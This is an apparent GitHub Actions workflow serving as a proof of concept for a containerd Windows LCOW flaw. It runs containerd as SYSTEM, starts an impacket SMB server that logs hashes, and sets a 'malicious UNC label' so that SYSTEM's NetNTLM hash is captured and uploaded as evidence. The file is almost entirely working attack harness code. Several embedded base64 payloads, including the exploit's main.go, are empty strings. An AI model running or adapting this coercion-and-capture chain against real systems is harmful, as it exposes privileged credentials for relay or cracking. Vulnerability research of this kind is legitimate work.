name: D17 LCOW UNC NetNTLM capture
on:
  workflow_dispatch:

jobs:
  ntlm:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - name: Setup - download containerd, build harness + stub, install impacket
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $base = 'C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          $cfg=''; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
          $mn=''; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
          $st=''; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'
          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
          Write-Output "BUILD_POC_EXIT=$LASTEXITCODE"
          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
          Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
          python -m pip install --quiet impacket 2>&1 | Select-Object -Last 5
          Write-Output "PIP_EXIT=$LASTEXITCODE"
          python -c "import impacket; print('IMACKET', impacket.__version__)" 2>&1

      - name: Start SMB server + containerd(SYSTEM) + trigger UNC label + capture
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ctdpoc'
          # free port 445
          Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
          Start-Sleep -Seconds 2
          # get non-loopback IPv4
          $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -First 1).IPAddress
          Write-Output "RUNNER_IP=$ip"
          $unc = "\\$ip\SHARE"
          Write-Output "UNC_PATH=$unc"
          # start impacket SMB server (logs hashes to file)
          $smbpy = python -c "import impacket,os;print(os.path.join(os.path.dirname(impacket.__file__),'..','examples','smbserver.py'))" 2>$null
          Write-Output "SMBPY=$smbpy"
          $pSmb = Start-Process -FilePath "python" -ArgumentList @($smbpy,'-smb2support','-debug','-ip','0.0.0.0','-outputfile','C:\ctdpoc\smb.log','SHARE','C:\ctdpoc\share') -RedirectStandardOutput "$base\smb_stdout.log" -RedirectStandardError "$base\smb_stderr.log" -PassThru
          Write-Output "SMB_PID=$($pSmb.Id)"
          Start-Sleep -Seconds 5
          # start containerd AS SYSTEM via scheduled task
          $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
          $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
          $task = New-ScheduledTask -Action $act -Principal $prin
          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
          Write-Output 'SCHEDULED_TASK_STARTED'
          Start-Sleep -Seconds 10
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          Write-Output '--- plugins ---'
          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
          Write-Output "=== malicious UNC label: $unc ==="
          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-unc' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_unc.out"
          Write-Output "POC_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 5
          Write-Output '=== SMB captured hashes ==='
          if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 } else { Write-Output 'smb.log missing' }
          Write-Output '=== smb stderr ==='
          if (Test-Path "$base\smb_stderr.log") { Get-Content "$base\smb_stderr.log" -Tail 30 }
          Write-Output '=== daemon log tail ==='
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 30 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-ntlm-evidence
          path: |
            C:\ctdpoc\smb.log
            C:\ctdpoc\smb_stderr.log
            C:\ctdpoc\smb_stdout.log
            C:\ctdpoc\prepare_unc.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
            C:\ctdpoc\config.toml
          if-no-files-found: warn
